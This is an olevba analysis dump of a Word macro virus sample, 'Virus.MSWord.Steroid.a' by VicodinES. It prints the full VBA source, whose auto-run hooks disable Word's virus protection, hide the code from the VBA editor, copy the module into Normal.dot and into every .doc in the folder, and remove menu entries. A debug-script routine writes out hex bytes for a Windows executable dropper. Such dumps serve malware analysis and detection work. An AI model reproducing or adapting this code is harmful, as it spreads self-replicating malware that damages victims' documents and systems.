olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Steroid.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Steroid.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Injekt.bas 
in file: Virus.MSWord.Steroid.a - OLE stream: 'Macros/VBA/Injekt'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
    
Sub Steroid()
    
    ' Steroid.Poppy by VicodinES
    ' "Whats Up" to : Slage Hammer, Spanska and the entire _Kim_Liberation_Army_

Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next
                                                                                                                                        If Application.ShowVisualBasicEditor = True Then Application.VBE.ActiveVBProject.VBComponents("Injekt").CodeModule.DeleteLines 1, 400
Do While (Application.ShowVisualBasicEditor = True)
Kill ("c:\startup.log")
Application.OrganizerDelete Source:=NormalTemplate.FullName, Name:="Injekt", Object:=wdOrganizerObjectProjectItems
Application.OrganizerDelete Source:=ActiveDocument.FullName, Name:="Injekt", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ActiveDocument.Close
Dialogs(994).Show
SendKeys "%{F4}", True
SendKeys "%F", True
SendKeys "X", True
Dialogs(524).Show
Dialogs(85).Show
Dialogs(98).Show
Loop
Randomize
With Options
.ConfirmConversions = False
.VirusProtection = False
.SaveNormalPrompt = False
End With
If Application.ShowVisualBasicEditor = True Then Application.VBE.ActiveVBProject.VBComponents("Injekt").CodeModule.DeleteLines 1, 400
ActiveDocument.ReadOnlyRecommended = False
Application.ScreenUpdating = False
Check = Int(Rnd * 422)
If Check = 3 And System.OperatingSystem = "Windows" Then Call Sustanon("c:\start.scr")
If Check = 3 And System.OperatingSystem = "Windows" Then Call Anadrol("c:\Anadrol.bat")
With Dialogs(wdDialogFileSummaryInfo)
.Author = "VicodinES"
.Execute
End With
Application.VBE.ActiveVBProject.VBComponents("Injekt").Export "c:\startup.log"
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(I).Name = "Injekt" Then NormInstall = True
Next I
For I = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(I).Name = "Injekt" Then ActivInstall = True
Next I
If ActivInstall = False Then
With ActiveDocument.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
If NormInstall = False Then
With NormalTemplate.VBProject
With .VBComponents.Import("c:\startup.log")
End With
End With
End If
If ActivInstall = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If NormInstall = False Then
If NormalTemplate.Saved = False Then NormalTemplate.Save
End If
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
'VMPCK v2.0 Beta
Application.ScreenUpdating = True
fuckoff:
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Can I have a bottle of warm Diet Mountain Dew?", vbInformation, "VMPCK v2.0 Beta / SR-1 Compatable"
MsgBox "Shout Out! ...Slage Hammer, Spanska and the entire _Kim_Liberation_Army_", vbInformation, "W97M/Steroid.Poppy"
End Sub
Sub FileSave()
On Error Resume Next
ShowVisualBasicEditor = False
Call Steroid
Application.ScreenUpdating = False
ActiveDocument.Save
Application.ScreenUpdating = True
End Sub
Sub FileSaveAs()
On Error Resume Next
ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Dialogs(wdDialogFileSaveAs).Show
Application.ScreenUpdating = True
Call Steroid
End Sub
Sub FilePrint()
On Error Resume Next
ShowVisualBasicEditor = False
Dialogs(wdDialogFilePrint).Show
Call Steroid
End Sub
Sub FileClose()
On Error Resume Next
ShowVisualBasicEditor = False
Call Steroid
Application.ScreenUpdating = False
If ActiveDocument.Saved = False Then ActiveDocument.Save
ActiveDocument.Close
End Sub
Sub FileExit()
On Error Resume Next
ShowVisualBasicEditor = False
Call Caffeine
Application.Quit
End Sub
Sub AutoOpen()
On Error Resume Next
ShowVisualBasicEditor = False
Call Steroid
End Sub
Sub AutoExit()
On Error Resume Next
ShowVisualBasicEditor = False
Call Caffeine
End Sub
Sub AutoClose()
On Error Resume Next
ShowVisualBasicEditor = False
Call Steroid
End Sub
Sub ViewVBCode()
On Error Resume Next
ShowVisualBasicEditor = False
End Sub
Sub Caffeine()
ShowVisualBasicEditor = False
Application.ScreenUpdating = False
Application.EnableCancelKey = wdCancelDisabled
Call Steroid
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Steroid
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:=""
Call Steroid
End If
Loop
End Sub
Sub Sustanon(strFile As String)
On Error Resume Next
ShowVisualBasicEditor = False
Dim hFile As Long
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "N start.com"
Print #hFile, "E 0100 4D 5A 50 00 02 00 00 00 04 00 0F 00 FF FF 00 00"
Print #hFile, "E 0110 B8 00 00 00 00 00 00 00 40 00 1A 00 00 00 00 00"
Print #hFile, "E 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00"
Print #hFile, "E 0140 BA 10 00 0E 1F B4 09 CD 21 B8 01 4C CD 21 90 90"
Print #hFile, "E 0150 54 68 69 73 20 70 72 6F 67 72 61 6D 20 6D 75 73"
Print #hFile, "E 0160 74 20 62 65 20 72 75 6E 20 75 6E 64 65 72 20 57"
Print #hFile, "E 0170 69 6E 33 32 0D 0A 24 37 00 00 00 00 00 00 00 00"
Print #hFile, "E 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 01A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 01B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 01C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 01D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 01E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 01F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0200 50 45 00 00 4C 01 04 00 4C 23 C0 52 00 00 00 00"
Print #hFile, "E 0210 00 00 00 00 E0 00 8E 81 0B 01 02 19 00 02 00 00"
Print #hFile, "E 0220 00 0A 00 00 00 00 00 00 00 10 00 00 00 10 00 00"
Print #hFile, "E 0230 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00"
Print #hFile, "E 0240 01 00 00 00 00 00 00 00 03 00 0A 00 00 00 00 00"
Print #hFile, "E 0250 00 50 00 00 00 04 00 00 00 00 00 00 02 00 00 00"
Print #hFile, "E 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00"
Print #hFile, "E 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0280 00 30 00 00 54 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02A0 00 40 00 00 E0 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 02F0 00 00 00 00 00 00 00 00 43 4F 44 45 00 00 00 00"
Print #hFile, "E 0300 00 10 00 00 00 10 00 00 00 02 00 00 00 06 00 00"
Print #hFile, "E 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60"
Print #hFile, "E 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 20 00 00"
Print #hFile, "E 0330 00 06 00 00 00 08 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0340 00 00 00 00 40 00 00 C0 2E 69 64 61 74 61 00 00"
Print #hFile, "E 0350 00 10 00 00 00 30 00 00 00 02 00 00 00 0E 00 00"
Print #hFile, "E 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 C0"
Print #hFile, "E 0370 2E 72 65 6C 6F 63 00 00 00 10 00 00 00 40 00 00"
Print #hFile, "E 0380 00 02 00 00 00 10 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00"
Print #hFile, "E 03A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 03B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 03C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 03D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 03E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 03F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 04A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 04B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 04C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 04D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 04E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 04F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0500 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0510 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0520 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0530 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0540 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0550 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0560 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0570 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0580 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0590 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 05A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 05B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 05C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 05D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 05E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 05F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0660 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0670 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0680 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0690 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 06A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 06B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 06C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 06D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 06E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 06F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0700 B8 4E 05 00 00 E9 F8 0F 00 00 6A 00 E8 00 00 00"
Print #hFile, "E 0710 00 FF 25 30 30 40 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 07A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 07B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 07C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 07D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 07E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 07F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 08A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 08B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 08C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 08D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 08E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 08F0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0900 00 00 BD 00 00 00 00 66 2B FF BF 00 10 00 C0 B8"
Print #hFile, "E 0910 FF 00 00 00 B9 FF FF FF FF F2 AE 8B D9 0B C9 0F"
Print #hFile, "E 0920 84 80 00 00 00 81 FF 00 C0 00 C0 73 78 90 90 90"
Print #hFile, "E 0930 90 F3 AE 0B C9 74 6E 90 90 90 90 2B D9 81 FB 4E"
Print #hFile, "E 0940 06 00 00 72 D4 2B FB B8 7F 15 00 C0 8B 18 81 7B"
Print #hFile, "E 0950 0C 56 4D 4D 20 75 4E 90 90 90 90 8B 5B 30 8D 43"
Print #hFile, "E 0960 3C 89 85 C1 20 40 00 8B 00 89 85 D2 20 40 00 8D"
Print #hFile, "E 0970 87 B2 00 00 00 89 43 3C 8D B5 02 20 40 00 B9 4E"
Print #hFile, "E 0980 05 00 00 89 BD B6 20 40 00 81 AD B6 20 40 00 02"
Print #hFile, "E 0990 20 40 00 89 BD 50 21 40 00 81 AD 50 21 40 00 02"
Print #hFile, "E 09A0 20 40 00 F3 A4 8C 8D B2 20 40 00 EB 00 EA 0A 10"
Print #hFile, "E 09B0 40 00 37 01 60 BA 00 00 00 00 8B 82 D2 20 40 00"
Print #hFile, "E 09C0 A3 00 00 00 00 8C 8A D6 20 40 00 E8 08 00 00 00"
Print #hFile, "E 09D0 61 EA 00 00 00 00 28 00 8D 82 46 21 40 00 52 50"
Print #hFile, "E 09E0 CD 20 67 00 40 00 83 C4 04 5A 89 82 DC 24 40 00"
Print #hFile, "E 09F0 52 B8 00 D5 00 00 2B C9 BB 02 00 00 00 BA 12 00"
Print #hFile, "E 0A00 00 00 CD 20 32 00 40 00 5A 72 3A 90 90 90 90 CD"
Print #hFile, "E 0A10 20 32 00 40 00 B8 00 D7 00 00 CD 20 32 00 40 00"
Print #hFile, "E 0A20 5A CD 20 4A 01 01 00 83 C4 0C 5A CD 20 52 01 01"
Print #hFile, "E 0A30 00 83 C4 18 5A 8B 82 51 25 40 00 50 CD 20 49 01"
Print #hFile, "E 0A40 01 00 83 C4 04 C3 55 8B EC 83 EC 20 53 56 57 BF"
Print #hFile, "E 0A50 00 00 00 00 80 BF 50 25 40 00 01 0F 84 62 03 00"
Print #hFile, "E 0A60 00 83 7D 0C 24 0F 85 58 03 00 00 C6 87 50 25 40"
Print #hFile, "E 0A70 00 01 60 8D B7 A1 25 40 00 8B 45 10 3C FF 74 0D"
Print #hFile, "E 0A80 90 90 90 90 04 40 88 06 46 C6 06 3A 46 2B C0 89"
Print #hFile, "E 0A90 87 69 25 40 00 89 87 6D 25 40 00 50 B8 FF 00 00"
Print #hFile, "E 0AA0 00 50 8B 5D 1C 8B 43 0C 83 C0 04 50 8B C6 50 CD"
Print #hFile, "E 0AB0 20 41 00 40 00 83 C4 10 03 F0 C6 06 00 81 7E FC"
Print #hFile, "E 0AC0 2E 45 58 45 0F 85 F1 02 00 00 B8 00 D5 00 00 2B"
Print #hFile, "E 0AD0 C9 8D B7 A1 25 40 00 BB 02 00 00 00 BA 01 00 00"
Print #hFile, "E 0AE0 00 CD 20 32 00 40 00 0F 82 CE 02 00 00 8B D8 B9"
Print #hFile, "E 0AF0 04 00 00 00 BA 3C 00 00 00 B8 00 D6 00 00 8D B7"
Print #hFile, "E 0B00 59 25 40 00 CD 20 32 00 40 00 B9 04 00 00 00 8B"
Print #hFile, "E 0B10 97 59 25 40 00 B8 00 D6 00 00 8D B7 A1 25 40 00"
Print #hFile, "E 0B20 CD 20 32 00 40 00 81 3E 50 45 00 00 0F 85 7E 02"
Print #hFile, "E 0B30 00 00 B9 04 00 00 00 8B 97 59 25 40 00 83 C2 34"
Print #hFile, "E 0B40 B8 00 D6 00 00 8D B7 5D 25 40 00 CD 20 32 00 40"
Print #hFile, "E 0B50 00 B9 04 00 00 00 8B 97 59 25 40 00 83 C2 28 B8"
Print #hFile, "E 0B60 00 D6 00 00 8D B7 AE 20 40 00 CD 20 32 00 40 00"
Print #hFile, "E 0B70 8B 87 5D 25 40 00 01 87 AE 20 40 00 B9 04 00 00"
Print #hFile, "E 0B80 00 8B 97 59 25 40 00 83 C2 38 8D B7 61 25 40 00"
Print #hFile, "E 0B90 B8 00 D6 00 00 CD 20 32 00 40 00 B9 04 00 00 00"
Print #hFile, "E 0BA0 8B 97 59 25 40 00 83 C2 3C 8D B7 65 25 40 00 B8"
Print #hFile, "E 0BB0 00 D6 00 00 CD 20 32 00 40 00 B9 02 00 00 00 8B"
Print #hFile, "E 0BC0 97 59 25 40 00 83 C2 14 B8 00 D6 00 00 8D B7 69"
Print #hFile, "E 0BD0 25 40 00 CD 20 32 00 40 00 B9 02 00 00 00 8B 97"
Print #hFile, "E 0BE0 59 25 40 00 83 C2 06 B8 00 D6 00 00 8D B7 6D 25"
Print #hFile, "E 0BF0 40 00 CD 20 32 00 40 00 8B 06 B9 28 00 00 00 F7"
Print #hFile, "E 0C00 E1 8B 97 69 25 40 00 03 D0 2B D1 03 97 59 25 40"
Print #hFile, "E 0C10 00 83 C2 18 89 97 71 25 40 00 B8 00 D6 00 00 8D"
Print #hFile, "E 0C20 B7 79 25 40 00 CD 20 32 00 40 00 80 BF 80 25 40"
Print #hFile, "E 0C30 00 FF 0F 84 78 01 00 00 C6 87 80 25 40 00 FF 8B"
Print #hFile, "E 0C40 87 81 25 40 00 03 87 85 25 40 00 89 87 55 25 40"
Print #hFile, "E 0C50 00 03 87 5D 25 40 00 2D 02 20 40 00 89 87 03 20"
Print #hFile, "E 0C60 40 00 2B D2 B8 4E 05 00 00 8B 8F 65 25 40 00 F7"
Print #hFile, "E 0C70 F1 40 F7 E1 50 03 87 81 25 40 00 89 87 89 25 40"
Print #hFile, "E 0C80 00 2B D2 B8 4E 05 00 00 8B 8F 61 25 40 00 F7 F1"
Print #hFile, "E 0C90 40 F7 E1 50 03 87 81 25 40 00 89 87 81 25 40 00"
Print #hFile, "E 0CA0 8B 87 81 25 40 00 03 87 85 25 40 00 89 87 75 25"
Print #hFile, "E 0CB0 40 00 C7 87 9D 25 40 00 40 00 00 E0 B9 04 00 00"
Print #hFile, "E 0CC0 00 8B 97 59 25 40 00 83 C2 50 B8 01 D6 00 00 8D"
Print #hFile, "E 0CD0 B7 75 25 40 00 CD 20 32 00 40 00 B9 28 00 00 00"
Print #hFile, "E 0CE0 8B 97 71 25 40 00 B8 01 D6 00 00 8D B7 79 25 40"
Print #hFile, "E 0CF0 00 CD 20 32 00 40 00 66 B9 40 00 C7 87 E0 20 40"
Print #hFile, "E 0D00 00 CD 20 67 00 66 89 8F E4 20 40 00 C7 87 AF 21"
Print #hFile, "E 0D10 40 00 CD 20 41 00 66 89 8F B3 21 40 00 66 B9 01"
Print #hFile, "E 0D20 00 C7 87 21 21 40 00 CD 20 4A 01 66 89 8F 25 21"
Print #hFile, "E 0D30 40 00 C7 87 2B 21 40 00 CD 20 52 01 66 89 8F 2F"
Print #hFile, "E 0D40 21 40 00 C7 87 3C 21 40 00 CD 20 49 01 66 89 8F"
Print #hFile, "E 0D50 40 21 40 00 8D B7 08 25 40 00 B9 12 00 00 00 AD"
Print #hFile, "E 0D60 03 C7 C7 00 CD 20 32 00 66 C7 40 04 40 00 E2 EF"
Print #hFile, "E 0D70 59 B8 01 D6 00 00 8B 97 81 25 40 00 03 97 8D 25"
Print #hFile, "E 0D80 40 00 2B D1 59 8D B7 02 20 40 00 CD 20 32 00 40"
Print #hFile, "E 0D90 00 B9 04 00 00 00 8B 97 59 25 40 00 83 C2 28 B8"
Print #hFile, "E 0DA0 01 D6 00 00 8D B7 55 25 40 00 CD 20 32 00 40 00"
Print #hFile, "E 0DB0 B8 00 D7 00 00 CD 20 32 00 40 00 61 C6 87 50 25"
Print #hFile, "E 0DC0 40 00 00 8B 45 1C 50 8B 45 18 50 8B 45 14 50 8B"
Print #hFile, "E 0DD0 45 10 50 8B 45 0C 50 8B 45 08 50 B8 00 00 00 00"
Print #hFile, "E 0DE0 FF 10 83 C4 18 5F 5E 5B C9 C3 41 6E 78 69 65 74"
Print #hFile, "E 0DF0 79 2E 50 6F 70 70 79 2E 39 35 20 62 79 20 56 69"
Print #hFile, "E 0E00 63 6F 64 69 6E 45 53 00 E1 21 40 00 04 22 40 00"
Print #hFile, "E 0E10 20 22 40 00 4B 22 40 00 6A 22 40 00 95 22 40 00"
Print #hFile, "E 0E20 B4 22 40 00 D3 22 40 00 F2 22 40 00 25 23 40 00"
Print #hFile, "E 0E30 D5 23 40 00 F1 23 40 00 8B 24 40 00 AA 24 40 00"
Print #hFile, "E 0E40 B5 24 40 00 02 21 40 00 0F 21 40 00 1A 21 40 00"
Print #hFile, "E 0E50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0E60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0E70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0E80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0E90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0EA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0EB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0EC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0ED0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0EF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0F00 28 30 00 00 00 00 00 00 00 00 00 00 38 30 00 00"
Print #hFile, "E 0F10 30 30 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0F20 00 00 00 00 00 00 00 00 46 30 00 00 00 00 00 00"
Print #hFile, "E 0F30 46 30 00 00 00 00 00 00 4B 45 52 4E 45 4C 33 32"
Print #hFile, "E 0F40 2E 64 6C 6C 00 00 00 00 45 78 69 74 50 72 6F 63"
Print #hFile, "E 0F50 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0F60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0F70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0F80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0F90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0FA0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0FB0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0FC0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0FD0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0FE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 0FF0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1020 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1060 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1070 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1080 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 1090 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10A0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10B0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
Print #hFile, "E 10D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
